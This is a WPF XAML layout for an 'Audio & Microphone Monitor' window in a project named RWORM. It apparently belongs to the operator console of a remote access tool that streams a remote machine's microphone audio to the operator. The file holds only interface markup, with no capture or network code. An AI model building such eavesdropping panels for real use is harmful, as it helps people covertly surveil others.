<Window x:Class="RWORM.GUI.Views.AudioMonitorWindow"
        xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        Height="440" Width="640"
        WindowStartupLocation="CenterScreen"
        Background="{StaticResource BackgroundSecondaryBrush}" Foreground="{StaticResource TextPrimaryBrush}"
        Title="Audio &amp; Microphone Monitor">
    <Grid>
        <Grid.RowDefinitions>
            <RowDefinition Height="54"/>
            <RowDefinition Height="*"/>
            <RowDefinition Height="34"/>
        </Grid.RowDefinitions>

        
        <Border Grid.Row="0" Background="{StaticResource BackgroundMainBrush}" BorderBrush="{StaticResource BorderBrush}" BorderThickness="0,0,0,1">
            <DockPanel Margin="20,0">
                <StackPanel Orientation="Horizontal" VerticalAlignment="Center">
                    <Image Source="pack://application:,,,/Resources/Assets/audio.png" Width="20" Height="20" Margin="0,0,10,0"/>
                    <TextBlock x:Name="TitleLabel" Text="Audio Monitor" FontSize="15" FontWeight="Bold"
                               Foreground="{StaticResource TextPrimaryBrush}" VerticalAlignment="Center" Margin="0,0,18,0"/>

                    <Button x:Name="ListenBtn" Content="⏹ Stop Listening" Click="Listen_Click"
                            Style="{StaticResource DangerButton}" Height="30" Padding="14,4"/>
                </StackPanel>

                <StackPanel Orientation="Horizontal" HorizontalAlignment="Right" VerticalAlignment="Center">
                    <TextBlock Text="Chunks Received: " Foreground="{StaticResource TextSecondaryBrush}" FontSize="12"/>
                    <TextBlock x:Name="ChunkCountLabel" Text="0" Foreground="#10B981" FontWeight="Bold" FontSize="12.5"/>
                </StackPanel>
            </DockPanel>
        </Border>

        
        <Border Grid.Row="1" Background="{StaticResource BackgroundMainBrush}" BorderBrush="{StaticResource BorderBrush}" BorderThickness="1"
                Margin="16" CornerRadius="8" Padding="24">
            <Grid>
                <StackPanel VerticalAlignment="Center" HorizontalAlignment="Center">
                    <Ellipse x:Name="AudioPulse" Width="74" Height="74" Fill="#10B981" Opacity="0.3"
                             HorizontalAlignment="Center" Margin="0,0,0,20"/>
                    <TextBlock Text="Live Microphone &amp; Audio Stream" FontSize="16" FontWeight="Bold"
                               Foreground="{StaticResource TextPrimaryBrush}" HorizontalAlignment="Center"/>
                    <TextBlock Text="Audio captured remotely is automatically played through your system speakers in real-time."
                               FontSize="12.5" Foreground="{StaticResource TextSecondaryBrush}" HorizontalAlignment="Center" Margin="0,8,0,0"
                               TextWrapping="Wrap" TextAlignment="Center" MaxWidth="460"/>
                </StackPanel>
            </Grid>
        </Border>

        
        <Border Grid.Row="2" Background="{StaticResource BackgroundMainBrush}" BorderBrush="{StaticResource BorderBrush}" BorderThickness="0,1,0,0">
            <TextBlock x:Name="StatusLabel" Foreground="{StaticResource TextSecondaryBrush}" FontSize="11.5" VerticalAlignment="Center" Margin="16,0"/>
        </Border>
    </Grid>
</Window>
